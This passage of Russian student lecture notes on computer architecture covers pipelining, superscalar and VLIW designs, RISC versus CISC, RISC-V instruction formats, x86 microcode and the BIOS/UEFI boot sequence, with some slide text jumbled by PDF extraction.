команд, часть которых могла пойти по U-конвейеру, а другоая по V-конвейеру, то после
этапа выборки можно быть их параллельно пустить на выполнение.© 2021
                                                                 Быстро       работающая
                                                                     МГУ/ВМК/СП

выборка могла одновременно эти два конвейера заполнять потоком команд, если потом
                         Двойной конвейер
оманд позволял это делать.
   Двойной конвейер с общим этапом выборки команд
   – (Fet) Извлечение инструкции из памяти
   –• (Dec)
       Двойной    конвейеробновление
            Декодирование,   с общим этапом
                                        EIP     выборки команд
        – (Fet)
   – (D-F)      Извлечение
            Извлечение     инструкции из памяти
                        данных
        – (Dec)
   – (Exe)      Декодирование,выполнение
            Непосредственное    обновление операции
                                           EIP
        – (D-F)
   – (Wrt)      Извлечение
            Запись         данных
                   результата
        – (Exe) Непосредственное
   Возможности                    выполнение операции
                  конвейеров неравноценны.
         – (Wrt) Запись результата
                                                           U-конвейер способен выполнять любые команды




                                    V-конвейер способен выполнять только простые команды, с «оглядкой» на
                                                                                   состояние U-конвейера



   • Впервые появился наРис.
                         Pentium:    введеныконвейер
                             23.14: Двойной   u- и v-конвейеры
   • Возможности конвейеров неравноценны                       29
    Суперскалярная и VLIW архитектуры. Можно увеличить число функциональных
устройств, тех компонентов логических цепей, которые выполняют нужные действия на
этапе выполнения. Таким образом получим суперскалярную архитектуру, когда доходим
до этапа получения операндов, после чего поток команд расходится на несколько рукавов.
    • Многие операции над данными не могут быть реализованы за один такт.
    • В суперскалярной архитектуре выполняющиеся команды на стадии операции
расходятся по нескольким функциональным устройствам (ФУ).


                                                          263
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • За распределение (планирование) потока команд по ФУ отвечает аппаратура
процессора.




                    Рис. 23.15: а) Суперскалярная архитектура; б) VLIW архитектура

    Крайняя форма такого распределения команд по разным линиям конвейера – VLIW
(Very Long Instruction Word) архитектура. Во VLIW-архитектуре каждая команда состоит
из нескольких микрокоманд, независимо друг от друга, выполняющих операции над
данными. Конвейер почти полностью дублируется, двоичный код команды бьется на
куски, которые являются самостоятельными командами. Эти куски проходят по линиям
из логических цепей.
    За то, что бы команды действительно не конфликтовали между собой и могли
выполняться параллельно, отвечает не процессор, а компилятор.
    Суперскалярная архитектура и прерывания Помимо сложностей с планированием,
есть еще сложности. Время прохождения функциональных устройств может различаться
в зависимости от операций.
    Поэтому может получится так, что следующее в потоке команд действие с целыми
числами уже завершилось, а команда с палвающей точкой, которая шла раньше в очереди,
еще не закончилась. Получим рассогласованное состояние программы.
    • Усложнение внутреннего устройства процессора может повлиять на ход выполнения
    • Выполнение команды может вызвать исключительную ситуацию (сбой), что
приведет к выбросу прерывания (например, с целью восстановления состояния
программы)
    • Целые числа и числа с плавающей точкой обрабатываются разными ФУ, за различное
время , например t1 < t3
    • Прерывание, обусловленное сбоем в x87 команде может быть доставлено для
обработки уже после того, как следующая команда с целым числом записала свой
результат
    • Необходима синхронизация доставки прерывания
    • Большая часть команд x87 синхронизирует обработку исключений от ранее
выполнявшихся команд x87




                                                 264
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Пример. В первой команде мы грузим из памяти целое число. Оно конвертируется
внутри функционального устройства представления числа с плавающей точкой,
укладывается на стэк регистров. Счетчик увеличивается на 1, а затем вычисляется
квадратный корень того, что было положено на стэк регистров.




                                  Рис. 23.16: Варианты написания кода

   Может произойти сбой при конвертации в число с плавающей точкой. Или может
произойти ситуация, когда не хватает регистров (уже увеличили счетчик на 1). Тогда
происходит доставка прерывания. Задействуются аппаратные механизмы процессора,
которые стопарят текущее выполнение и перекидывают управление на специальные
предопределенные функции.
   Такое прерывание не пытается воостановить работу программы из-за того, что
неизвестно, зафиксирован ли результат переменной cnt.

   Для того, чтобы исправить это, поменяем порядок команд так, чтобы cnt
увеличивалось только после работы команды FSQRT, потому что последовательная
выполнение команд будет синхронизировать доставку прерывания.

   Либо можно выполнить специальную команду FWAIT, которая гарантированно
зафиксирует доставку всех исключений и требований прервать работу, обусловленных
какими-то собысиями в процессора x87.

   Производительность: особенности современной архитектуры Intel64 и не только
   Рассмотрим основные приемы и механизмы, направленные на улучшение
производительности.
   • Многоядерность
   • Многоуровневый кэш, раздельный кэш кода и данных
   • Суперскалярная архитектура – такая архитектура, когда несколько функциональных
устройств, одновременно обслуживающих этап выполнения
   • Векторные команды. Содержимое какого-нибудь регистра тракртуется как некоторая
совокупность однородных данных. Она реализована в таких расширениях набора команд
как MMX, 3DNow!, SSE, ...
   • Внеочередное выполнение команд


                                                 265
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Предсказание переходов
   • Внутреннее RISC-ядро. Современный процессор, не смотря на то, что он сохраняет
всю системы команд, имеет внутри еще один процессор, который отвечает за выполнение
того, что туда подается.
   • ...


CISC и RISC архитектуры.
   RISC (Reduced Instruction Set Computer) – сокращенный набор команд
   CISC (Complex Instruction Set Computer) – сложный набор команд.
   • Исторически CISC предшествовал RISC
     – PDP-11 → VAX / CISC, 1977 г.
     – MIPS, SPARC / RISC, конец 80-х
   Наращивать тактовую частоту становилось все сложнее. Поэтому было принято
решение попытаться получить максимальную простоту команды. Электрические цепи,
реализующие ее, смогут работать на больших частотах. Таким образом простота
внутреннего устройства позволит улучшить показатели на выходе .
   Принципы:
   • Простые операции
     – Ограниченный набор простых команд (например, нет деления)
     – Команда выполняется за один такт
     – Фиксированная длина команды (простота декодирования)
   • Конвейер. Если сформировать конвейер исполнения, он будет просто устроен.
     – Каждая операция разбивается на однотипные простые этапы, которые выполняются
параллельно
     – Каждый этап занимает 1 такт, в т.ч. декодирование
   • Регистры
       – Много однотипных взаимозаменяемых регистров (могут использоваться и для
данных, и для адресации). Их можно использовать для хранения чисел, с которыми
работаем, и для произольных арифметических операций.


   • Модель работы с памятью. В действиях с какими-то числами сокращается число
     типов операндов. Если хотим рпботать с памятью, доступны всего две команды.

            – Отдельные команды для загрузки/сохранения в память Альтернативное
              название RISC-архитектур
            – Load/Store-машина
            – Команды обработки данных работают только с регистрами. Становится
              гораздо проце оценить длительность команды.


                                        266
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Результат

            – Устройство ядра процессора становится проще

                      * Проще наращивать частоту процессора
                      * Меньше энрергопотребление
            – Несмотря на то, что число команд, требуемых для реализации какой-то
              функциональности становится больше, суммарно они все равно будут
              выполняться гораздо быстрее.
            – По сравнению с CISC объем кода (число команд) при реализации того же
              алгоритма на RISC-машине будет больше

   • Сложность оптимизаций перенесена из процессора в компилятор

            – Производительность сильно зависит от компилятора


RISC-V – архитектура                      RISC-микропроцессоров                  с     открытым
исходным кодом.
   Существует две версии процессора и, соответственно, два набора команд : 32 и 64
разряда.
   Характеристики RV 32 ISA

   • Машинное слово – 32 разряда. Такой размер имеют: адрес, регистры и размер
     команды.

   • 32 регистра общего назначения x0 – x31. Счетчик команд pc. Один из регистров x0
     «запаян» всегда хранить 0, он не реагирует на записи.

   • Базовый набор команд над целыми числами RV32I – 47 команд. Этот набор может
     расширяться. Наример, команды умножения и деления являются дополнительным
     набором. Только простые операции: сложение, вычитание, логика, сдвиги,
     сравнение, передача управления.

   • Большинство команд трехадресные. Для компиллятора такая форма команд
     является наиболее удобной.

   • Умножение, деление и взятие остатка вынесены в расширение набора команд
     RV32M, который необязателен для реализации, как и другие расширения.

   • Флагов состояний нет, аппаратной поддержки стека нет, каК и многих других
     излишеств, например, команды MOV. Нет команды пересылки из регистра в
     другой регистр.



                                                267
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
           Архитектура ЭВМ и язык ассемблера                                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
           Падарян Вартан Андроникович                                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




              Отличия RISC-V от x86.                                                                       © 2021 МГУ/ВМК/СП



          В чем
             • x86.RISC-V
                    Система совсем
                            кодированияне  похожсложная.
                                         достаточно на x86Есть код операции (1-3 байт),
               который может предворяться префиксами (+4 байта). Затем кодируются операнды
               Формат машинной команды
                (2 байта).
            Порядок байт   Если один операнд представляет из себя что-то лежащее в памяти, в
                адресном коде модет потребоваться закодировать сещение (+4 байта). Если еще
   • x86        один операнд – что-то лежащее в теле команды, нужно еще 4 байта.
                ⇒ Таким образом длина команды от 1 до 15 байт.

              • RISC-V. – всегда 32 разряда.
                Из памяти извлекается 4 байта, после чего увеличивается счетчик команд. Затем
                переход на выборку следующей команды.
      Переменная длина, от 1 до 15 байт.
                Присутствуют всего 4 простых формата : R-type, I-type, S-type, U-type.

   • RISC-V –Нумерация
             всегда 32 разрядом идет справа на лево. Всего 7 разрядов.
                          разряда, 4 простых формата
• Как сложить регистр с 32-х
  разрядной константой?
• Как обратиться к
  произвольному адресу                                                                                                       37
  памяти?!?
                                                                     Рис. 23.17: RISC-V


                Декодирование максимально простое.

              Проблемы:

              • сложение регистра с 32-х разрядной константой

              • обращение к произвольному месту памяти

               Длинные константы, которые не умещаются внутри команды, приходится бить на 2
           куска: отдельно загружаются старшие 20 разрядов, а затем используется непосредственно
           закодированная величина immediate operand, в котором указывается 12 разрядов(см. рис          © 2021 МГУ/ВМК/СП



                                      В чем RISC-V совсем не похож на x86
           23.18).
                                                                Формат машинной команды
                                                     LUI x5, 0x12345       ; загружаем старшие 20 разрядов x5
                                                     ADDI x5, x5, 0x678    ; заполняем младшие 12 разрядов x5

                                                     LW   x5, 0xc(x6)      ; загружаем в x5 слово из памяти
                                                                           ; по адресу x6+0xc
                                                                           ; константа кодируется 12 бит
                                                                           ; как получить произвольный базовый
                                                                           ; адрес – см. пример выше



                                      Рис. 23.18: •Сложение
                                                     RISC-V – всегдарегистра
                                                                          32 разряда, с4 простых формата
                                                                                         32-х разрядной  константой
                                               • Как сложить регистр с 32-х
                                                   разрядной константой?
                                                 • Как обратиться к
                                                   произвольному адресу                                         38
                                                   памяти?!?




                                                                                268
                 ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                 МАТЕМАТИКИ И КИБЕРНЕТИКИ
                 МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Вызова функций в привычном виде не существует.

   • Вместо стэка для адреса возврата используется явно заданный регистр x1.
                                                                                              © 2021 МГУ/ВМК/СП



   • Регистры и флаги можноВне
                             чем  RISC-V не
                               сохранять    похож на x86
                                         а использовать в рамказ одной команды.
                                           Сравнения и передача управления
                                  • Безусловный переход
                                                     ; jump and link [register]
                                  JAL   x1, 0x12345  ; x1  pc + 4
                                                     ; pc  pc + ОП2 (20 разрядов)
                                  JALR x1, x28, 0x20 ; x1  pc+4
                                                     ; pc  ОП2 + ОП3 (12 разрядов)

                                  • Сравнения
                                  SLT[U]   x28, x29, x30 ; if (ОП2 <[u] ОП3) {
                                                         ;    ОП1  1 } else {
                                                         ;    ОП1  0
                                                         ; }
                                  • Условные переходы
                                  BEQ   x28, x29, 0x10   ; if (ОП1 == ОП2) {
                                                         ;    pc  pc + (2 * ОП3)
                                                         ; } // ОП3 – 12 разрядов                    39



                                  Рис. 23.19: Сравнения и передача управления



Конвейер RISC-V
   В каждой команде присутствует операция над данными из регистров. Даже при
образении в память происходит сложение. Таким образом выполнение команды загрузки
идеологически мало чем отличается от сложения.

   • – Если происходит обращение в память, исполнительный адрес получается
     сложением базового регистра и непосредственно закодированного значения


   Этапы конвейера похожи на то, что мы видели в x86. Принципиально они даже проще.

   Этапы конвейера RISC-V:

  1. Извлечение команды из памяти, увеличение pc на 4

  2. Декодирование и извлечение значений операндов – регистров и непосредственно
     закодированной константы

  3. Выполнение операции

  4. Обращение к памяти, если только команда с памятью работает

  5. Запись результата в регистр.


                                                             269
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   В силу такой простоты и открытости исходного кода, архитектура RISC-V получила
распространение.
   История развития x86 • 4004 – ноябрь 1971. 4-битный микропроцессор. Первый в
мире коммерчески доступный однокристальный микропроцессор.
   • 8008 – апрель 1972. 8080 – апрель 1974. 8-битные процессоры.
   • 8086 – 1978. Размер слова – 16 бит, ширина адресной шины – 20 бит. Адреса
вычисляются с использованием сегментных регистров.
   • 80186 – 1982. Добавлено несколько новых инструкций.
   • 80286 – 1982. Ширина адресной шины – 24 бита, добавлено устройство контроля
памяти – MMU. Процессор мог переключаться между двумя режимами – реальным и
защищенным.
   • 80386 – октябрь 1985. Снят с производства в 2007. Размер слова – 32-разряда.
Процессор мог переключаться между тремя режимами – реальным, защищенным,
виртуальным. Адресуемая память – 4 ГБ.
   • ...
   • Intel Xeon E7-8870 – 2011, 10 ядер, до 8 ЦПУ в системе. 2.4 (2.8) ГГц; 2.2×109
транзисторов; системная шина QPI: 6.4 ГТ/с; обращение к памяти одного процессора: 32
ГБ/с (4х8ГБ/с), адресуемая память – 4 TБ ; Кэш L1: 640КБ L2: 2.5МБ, L3: 30МБ.
   •…
   • Intel Xeon 8180M – 2017, 28 ядер, до 8 ЦПУ в системе. 2.5 (3.8) ГГц; транзисторов
в аналоге от AMD 19×109 ; системная шина UPI: 10 ГТ/с; обращение к памяти одного
процессора: 120 ГБ/с (6х20ГБ/с); адресуемая память – 1.5ТБ. Кэш L1: 896+896КБ, L2:
28МБ, L3: 38.5 МБ.
   •…


Развитие системы команд в архитектуре x86
   Параллельно с развитием процессоров развивались технологии, которые позволяют
их строить. В силу этого сохранялся экспоненциальный рост числа транзисторов и
линейно росла их сложность.

   Последние 23 расширения команд в период 2011-2016 преимущественно
представляют собой системные команды, которые отвечают не столько за
производителность, сколько за вопросы безопасности, изоляцию программ и данных
друг от друга.
   Помимо этого появилась возможно запускать несколько различных операционных
систем параллельно.
   В последние годы не происходило сильных качественных изменений во внутренннем
устройстве процессора. Происходил кольчественный рост: увеличивалось число ядер,
размер кэша.


                                         270
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
звитие системы команд в архитектуре x86
                                                                                                                                                  © 2021 МГУ/ВМК/СП

           Архитектура ЭВМ и язык ассемблера                                                                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
3 расширения команд в период 2011-2016
           Падарян Вартан Андроникович
                                                                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                                                                                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU

начительная часть – системные команды,                 Микрокод
твечающие за безопасность и изоляцию
                           • По мнению исследователя Andrew Baumann на
рограмм и данных             протяжении нескольких лет аппаратное
                                                               устройство процессоров Intel принципиально не
– VT-x, VT-d / AMD-V                                           менялось, для поддержки новых команд
                                                               обновлялась его «прошивка» – микрокод
– SGX                                                      •   Микрокод — программа, реализующая набор
                                                               инструкций процессора
– MPX / MPK                                                •   Современные процессоры x86 динамически, на
– CET                                                          лету, транслируют команды x86 в микрокоманды
                                                               (μops), которые выполняются внутренним RISC-
                                                               ядром
                                                                –   Подход применяется не только в x84 / Intel
                                                                –   Удобно исправлять ошибки в поведении сложных
mann (Microsoft Research).                                          команд и распространять эти исправления, т.е. новую
                                                                    версию микрокода (пакет linux-firmware)
 the new software. // 16th                                      –   Удобно расширять набор команд
n Hot Topics in Operating Systems,                         •                           43
                                                               Идея микрокода была предложена еще на заре
                                                               эпохи компьютеров
                                                                –   M. V. Wilkes, J. B. Stringer. Microprogramming and the
                                                     Design of the Control Circuits in an Electronic Digital
                                     Рис. 23.20: Развитие    системы
                                                     Computer.               команд
                                                                // Proc. Cambridge   Phil. Soc., pt. 2, vol. 49, AprilРис. 23.21: Путь команды
                                                                    1953, pp. 230-238.                                                                   44




                          Микрокод. По мнению исследователя Andrew Baumann на протяжении нескольких
                      лет аппаратное устройство процессоров Intel принципиально не менялось, для поддержки
                      новых команд обновлялась его «прошивка» – микрокод.
                          На входе получаем команды привычной нам архитектуры с новыми дополнениями.
                      Они попадают в модуль бинарной трансляции, который их переводит в поток более
                      мелких и простых команд внутреннего RISC-процессора. Управляется это все служебной
                      программой. Процессор рекурсивно реализовал идею полноценного компьтера.
                          Именно принципы RISC-архитектуры позволяют развивать и улучшать
                      характеристики, сохраняя простоту его внутреннего устройства.
                          Микрокод — программа, реализующая набор инструкций процессора
                          Современные процессоры x86 динамически, на лету, транслируют команды x86 в
                      микрокоманды (μops), которые выполняются внутренним RISC-ядром

                            • Подход применяется не только в x84 / Intel

                            • Удобно исправлять ошибки в поведении сложных команд и распространять эти
                              исправления, т.е. новую версию микрокода (пакет linux-firmware)

                            • Удобно расширять набор команд

                           Идея микрокода была предложена еще на заре эпохи компьютеров




                                                                                                  271
                               ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                               МАТЕМАТИКИ И КИБЕРНЕТИКИ
                               МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 24. Системное управление работой современного
компьютера
Режимы работы современного процессора архитектуры Intel64/AMD64,
загрузка.
   Современный 64-х разрядный процессор представляет собой целую совокупность
различных процессоров. С расширением набора команд появлялись различные режимы
работы, а старые режимы сохраняются.
   Изменения хода выполнения называются режимами работы(см. рис 24.1). Начальная                        © 2021 МГУ/ВМК/СП




                                   Начальная загрузка компьютера – последовательность (цепочка)
                                   выполнения все более сложных загрузчиков.                                    2
                                   Конечная цель – загрузка операционной системы


                                  Рис. 24.1: Архитектура 64-х разрядного процессора

загрузка компьютера – последовательность (цепочка) выполнения все более сложных
загрузчиков. Конечная цель – загрузка операционной системы.
   • Когда современный компьютер включается, его работа начинается в реальном
     режиме, когда он представляет собой 16-ти разрядный компьютер начала 1980-х
     годов.

   • Затем можно перейти в защищенный режим, который соответствует тому, что
     изучалось в данном курсе (32-х разрядный режим) .

            – Если остановиться в 32-х разрядном защищенном режиме, для некоторых
              запускаемых программ можно демонстрировать возможности аппаратуры так,
              будто они работают на 16-ти разрядной машине – это режим ”виртуальной
              машины 8086”

   • Из защищенного режима можно перейти в полноценный 64-х разрядный режим
     через промежуточный режим совместимости.


                                                                     272
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • В режи управления системой процессор может переключаться в зависисмости от
     событий. Например, при подсоединении флэшки происходит замыкание цепей и
     процессор переходит в этот режим. Он считывает некоторый встроенный во флешку
     код, который потом позволит с ней работать, его устанавливает, затем возвращается
     в обычный режим работы.

Прохождение по разным режимам – задача загрузчика (для x86 он называется BIOS).
   Переход из одного такого состояния в другое – это некоторая согласованная
последовательность действий, которая выражается в разипи определенный значений
в некоторые управляющие регистры. Только нужно последовательность действий
переведет работающий процессор из одного согласованного состояния в другое.


Встраиваемое ПО, обеспечивающее начальную загрузку компьютера:
BIOS, ACPI, UEFI
   Схема загрузки IA-32. При включении питания некоторую последовательность
действий выполняет сам процессор. В первую очередб выполняется диагностика
сохранности электрических цепец, проверка на отсутствие коротких замыканий и обрыва
линий.

   • Выполнение команд начинается с адреса 0xFFFFFFF0

            – Содержимое памяти ROM отображается на адресное пространство таким
              образом, что содержащийся в ней код становится доступен, начиная с этого
              адреса.
            – Микросхема ROM содержит BIOS – набор микропрограмм, предоставленных
              производителем аппаратуры, разработчиком материнской платы. BIOS
              проводит дополнительное тестирование, проверяет доступность памяти.
              Работа микропрограмм направлена на то, чтобы дать возможность провести
              конфигурацию аппаратуры и программно взаимодействовать с ней.

   • В тот момент, когда началась загрузка, код BIOS расположен в микросхеме. BIOS
     выполнит следующие действия

            – Копирование своего кода из ROM (микросхемы) в RAM (оперативную память
              компьютера)
            – Самопроверка кода
            – Начальная конфигурация аппаратуры
            – Размещение в оперативной памяти ACPI таблиц, которые описывают
              периферийные устройства.



                                           273
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                  После того, как служебная информация помещена, передается управление
                  следующему загрузчику, который находится в цепочке загрузки.
            – MBR – устройство, которое хранит информаци в блочном виде.
              Последовательно пытаемся копировать MBR (сектор №0, 512 байт) каждого
              загрузочного устройства в память по адресу 0x7c00. Если сектор скопировать
              удалось, BIOS передает управление на адрес 0x7c00 и заканчивает свою
              работу.

   • MBR-загрузчик копирует в память загрузчик операционной системы и передает ему
     управление.

   • Загрузчик операционной системы копирует в память ядро операционной системы
     и передает ему управление. Уже этот полноценный код копирует модуль самой
     операционной системы.

   Реальный режим.

   • В каждый момент времени работает только одна программа

            – Эта программа управляет всеми ресурсами (ЦПУ, память, ввод/вывод)

   • Машинное слово 16 разрядов, адрес памяти 20 разрядов

            – Сегментные регистры работают так, как работали 40 лет назад.
            – Исполнительный адрес = (сег_рег) « 4 + смещение. Таким образом 16 разрядов
              сместили до 20. Так можем адресаваться внутри адресного пространства
              размером 1 Мбайт.

   • На вычислительном ядре так стартует только начальное загрузочное ядро. На нем
     выполняется одна единственная программа, не имеющая ограницений, которой
     доступны все настройки. Доступна вся адресуемая память

   • Периферийные устройства управляются через порты ввода/вывода (команды in и
     out).

   UEFI. Есть определенная сложность в использовании тех служебных функций,
которые размещают BIOS в памяти для того, чтобы можно было работать с
периферийными устройствами. Сам BIOS – 16-ти разрядная программа.
   После того, как BIOS все настроил мы либо остаемся в 16-ти разрядном мире,
либо загрузчик операционной системы переключит в 32 разряда, т.е. все функции
BIOS становятся бесполезными. Для того, чтобы справиться с этими проблемами,
возник определенный стандарт того, как загрузчик должен быть устроен. Этот стандарт
называется UEFI – (Unified) Extensible Firmware Interface.


                                             274
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Выполнение задачи перевода системы в 32-х разрядный режим и более сложная
настройка аппаратуры – обязанности загрузчика. Вспомогательные функции, которые
он будет размещать, становятся применимыми со стороны операционной системы.
Этот интерфейс, который позволяет реализовать возможности аппаратуры называется
интерфейсом EFI(Extensible Firmware Interface).
   Спецификация состояния аппаратуры перед загрузкой ОС с помощью ACPI таблиц.
   Стандарт ACPI (Advanced Configuration and Power Interface) был разработан
для того, чтобы можно было эффективно управлять энергопотреблением различных
периферийных устройств.
   Проблема: управление энергопотреблением периферийных устройств и набора
микросхем. Поэтому ОС должна содержать драйвер для каждой модели материнской
платы.
   Решение: организовать драйвер в виде двух раздельных компонент: описания
аппаратуры и интерпретатора этого описания. Таким образом часть операн=ционной
системы, которая отвечает за управление конкретным устройством, разбилась на
писательную и стандартизированную части. Таким образом он размещает в памяти два
вида таблиц.
   BIOS размещает в оперативной памяти две группы ACPI таблиц:
   • Перечисление имеющейся в компьютере аппаратуры и некоторых ее свойств

   • Формируется таблица, набор микропрограмм, описывающих работу с устройствами
     на архитектурно независимом языке AML
В состав ОС входит интерпретатор языка AML.
   ⇒ Таким образом, если раньше операционная система включала в себя значительное
количество драйверов, теперь количество драйверов и сложность их устройства можно
уменьшить. Главное – наличие AML интерпретатора, который может запросить ACPI
таблицу из оперативной память.
   ⇒ Это устройство взаимодействия унифицировалось и упростилось.


Многозадачная работа компьютера: требования к аппаратуре.
   При запуске нескольких пользовательских программ одновременно возникает
ситуация, когда они мешают друг другу. Необходимо урегулировать, какое приложение
использует какой диапазон физической памяти, порядок их обращения к устройствам
ввода/вывода и т.д.

   Для решения этой прлемы нужно
   - изолировать программы
   - для работы с уникальными ресурсами прикладные программы должны запрашивать
разрешение у операционной системы.


                                      275
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




  1. Привилегированный режим

             • Разделение машинных команд на две категории: пользовательские и
               привилегированные.
                  Внутри процессора должен быть служебный регистр, который будет
                  определять, в каком состоянии мы находимся: работает операционная
                  система или работает приложение.
                  Необходимые аппаратно реализованные механизмы:

  2. Механизм защиты памяти

             • Изоляция кода/данных различных программ (и операционной системы) друг
               от друга

  3. Таймер – устройство, которое время от времени генерирует сигнал, по которому все
     останавливается, а управление возвращается внутрь операционной системы на одну
     из ее функций(механизм прерываний).

             • Принудительное вытеснение программы с процессора
             • Многозадачность: невытесняющая и вытесняющая

  4. Механизм прерываний

             • Возможность процессора отреагировать на возникновение некоторого
               события – передать управление на определенный код и изменить состояние
               регистров и памяти
                         - (не)штатный ход выполнения очередной команды
                         - сигналы от других устройств, в том числе – от таймера


Модели памяти.
   Модели памяти в IA-32
